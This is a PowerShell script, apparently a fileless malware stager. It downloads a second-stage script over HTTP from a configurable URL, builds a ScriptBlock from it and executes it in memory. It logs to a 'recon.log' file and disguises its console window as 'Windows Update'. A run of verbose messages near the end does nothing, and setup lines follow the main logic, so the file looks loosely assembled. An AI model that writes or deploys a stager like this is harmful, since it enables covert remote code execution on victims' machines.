<#
.SYNOPSIS
    Endpoint-driven in-memory script loader.

.DESCRIPTION
    Resolves the configured endpoint, downloads the stage 2 text
    with a bounded timeout, checks the returned length and then
    executes the script block in the current session.

.NOTES
    No script content is written to disk.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://internal.corp:80/stage2.ps1",
    [string]$StageLog = "$env:TEMP\recon.log",
    [int]$TransferTimeout = 45
)
$ErrorActionPreference = "Stop"

# Text retrieval
function Get-StageScriptText {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching script text from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadString($SourceUrl)
}

# In-memory execution
function Invoke-Stage2Script {
    [CmdletBinding()]
    param(
        [string]$ScriptBody = ""
    )

    if ([string]::IsNullOrWhiteSpace($ScriptBody)) {
        throw "Stage 2 script body is empty"
    }
    Write-Verbose ("Script length: " + $ScriptBody.Length)
    $ScriptBlock = [ScriptBlock]::Create($ScriptBody)
    return $ScriptBlock.Invoke()
}

try {
    Write-Verbose "Starting in-memory stage"
    $PayloadText = Get-StageScriptText -SourceUrl $RemoteUrl -TimeoutSec $TransferTimeout
    $OperationResult = Invoke-Stage2Script -ScriptBody $PayloadText
    Write-Verbose "Stage result: $($OperationResult)"
}
catch {
    Write-Warning "In-memory loader failed: $($_.Exception.Message)"
}

$LoadReport = [ordered]@{
    Stage = "memory"
    Endpoint = $RemoteUrl
    ScriptLength = $PayloadText.Length
}
$LoadReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Retry budget remaining"
Write-Verbose "Inspecting process list"
Write-Verbose "Reading configuration values"
Write-Verbose "Exporting operation report"
Write-Verbose "Validating result"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Starting workflow"
Write-Verbose "Stage handoff finished"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Resolving configured target"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$Host.UI.RawUI.WindowTitle = "Windows Update"
